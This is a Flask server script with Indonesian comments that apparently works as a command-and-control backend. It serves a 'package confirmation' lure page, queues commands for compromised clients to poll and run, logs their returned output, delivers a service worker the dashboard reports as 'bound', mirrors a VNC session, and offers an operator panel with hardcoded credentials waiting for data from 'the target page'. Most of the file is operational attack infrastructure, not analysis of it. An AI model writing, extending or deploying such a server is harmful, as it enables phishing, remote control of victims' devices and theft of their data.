from flask import Flask, render_template, request, jsonify, render_template_string, redirect
import time

app = Flask(__name__)

USER_CORE = "operator_gear99"
PASS_CORE = "G99_SecureControl_2026!"

current_command = None
latest_logs = ["[SYSTEM] Core Server initialized..."]

@app.route('/')
def index():
    return "Gear99 Core Server Active"

@app.route('/konfirmasi-paket')
def target_page():
    return render_template('target.html')

import hashlib

# Fungsi pembantu untuk memverifikasi kredensial secara aman
def verifikasi_kredensial(username, password):
    # Menggunakan hash SHA-256 agar password tidak tersimpan dalam bentuk teks polos
    user_target = "admin"
    pass_hash_target = "f562dc25e243b3ee60216503b965f3f01bcf5a22bb0b79ec264614e3046f49ff" # hash dari medusa123
    
    hasher = hashlib.sha256(password.encode()).hexdigest()
    return username == user_target and hasher == pass_hash_target

@app.route('/login', methods=['POST'])
def login_operator():
    data = request.json
    if data.get('username') == USER_CORE and data.get('password') == PASS_CORE:
        return jsonify({"status": "authenticated", "token": "TOKEN_GEAR99_CORE_ACTIVE"})
    return jsonify({"status": "denied", "message": "Kredensial Salah!"}), 401

@app.route('/send_command', methods=['POST'])
def send_command():
    global current_command
    data = request.json
    current_command = data.get('command')
    add_log(f"Mengirim perintah ke sistem: [{current_command.upper()}]")
    return jsonify({"status": "queued"})

@app.route('/poll_command', methods=['GET'])
def poll_command():
    global current_command
    if current_command:
        cmd = current_command
        current_command = None
        return jsonify({"command": cmd})
    return jsonify({"command": None})

@app.route('/report_output', methods=['POST'])
def report_output():
    data = request.json
    output_text = data.get('output', '')
    add_log(f"[RESPONSE] {output_text}")
    return jsonify({"status": "logged"})

@app.route('/get_logs', methods=['GET'])
def get_logs():
    return jsonify({"logs": latest_logs})

# 💡 JALUR KHUSUS AMAN: Mengembalikan struktur halaman statis murni untuk bingkai simulator
@app.route('/vnc_mirror')
def vnc_mirror():
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <style>body,html,iframe { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#000; border:none; }</style>
        </head>
        <body>
            <script>
                // Mengarahkan secara dinamis ke IP publik server tanpa merusak enkripsi SSL dasbor utama
                document.write('<iframe src="http://' + window.location.hostname + ':6080/vnc.html?autoconnect=true&resize=scale"></iframe>');
            </script>
        </body>
        </html>
    ''')

def add_log(message):
    timestamp = time.strftime('%H:%M:%S')
    latest_logs.append(f"[{timestamp}] {message}")
    if len(latest_logs) > 50:
        latest_logs.pop(0)
        
@app.route('/static/sw.js')
def serve_sw():
    # Mengirimkan file Service Worker dengan header mime-type JavaScript yang sah
    return app.send_static_file('sw.js'), 200, {'Content-Type': 'application/javascript'}

from flask import request, redirect

@app.route('/operator', methods=['GET', 'POST'])
def operator_panel():
    pesan_error = ""
    
    # 1. Jika operator menekan tombol "Masuk Panel" (Metode POST)
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Lakukan pemeriksaan kredensial (admin / medusa123)
        if username == "admin" and password == "medusa123":
            # PENGALIHAN: Jika sukses, alihkan ke halaman dasbor utama
            return redirect('/operator/dashboard')
        else:
            pesan_error = "<p style='color: red;'>Kredensial Salah! Akses Ditolak.</p>"
            
    # 2. Jika baru membuka halaman (Metode GET) atau login gagal
    return f'''
    <html>
        <head><title>Gear99 - Dual Active Operator</title></head>
        <body style="background-color: #0b0c10; color: white; font-family: sans-serif; padding: 50px;">
            <h2>[ GEAR99 LAB AUTH ]</h2>
            {pesan_error}
            <form method="POST" action="/operator">
                <p>Username: <input type="text" name="username" required style="background: #1f2833; color: white; border: 1px solid #45f3ff;"></p>
                <p>Password: <input type="password" name="password" required style="background: #1f2833; color: white; border: 1px solid #45f3ff;"></p>
                <input type="submit" value="Masuk Panel" style="background: #45f3ff; color: black; border: none; padding: 5px 15px; cursor: pointer;">
            </form>
        </body>
    </html>
    '''

@app.route('/operator/dashboard')
def operator_dashboard():
    # Halaman bagian dalam dasbor pemantauan data target
    return '''
    <html>
        <head><title>Gear99 - Main Control Room</title></head>
        <body style="background-color: #0b0c10; color: #45f3ff; font-family: monospace; padding: 30px;">
            <h2>[ GEAR99 CENTRAL LAB CONTROL - CORE STREAM ]</h2>
            <hr style="border: 1px solid #1f2833;">
            <p style="color: #66fcf1;">Status Server: <span style="color: lightgreen;">ONLINE</span></p>
            <p style="color: #66fcf1;">PWA Service Worker: <span style="color: lightgreen;">BOUND (ACTIVE)</span></p>
            <div style="background: #1f2833; padding: 20px; border-radius: 5px; color: white; min-height: 200px;">
                <strong>[ LOG STREAM DATA INCOMING ]</strong>
                <p style="color: gray;">Menunggu paket sinkronisasi dari halaman target...</p>
            </div>
        </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
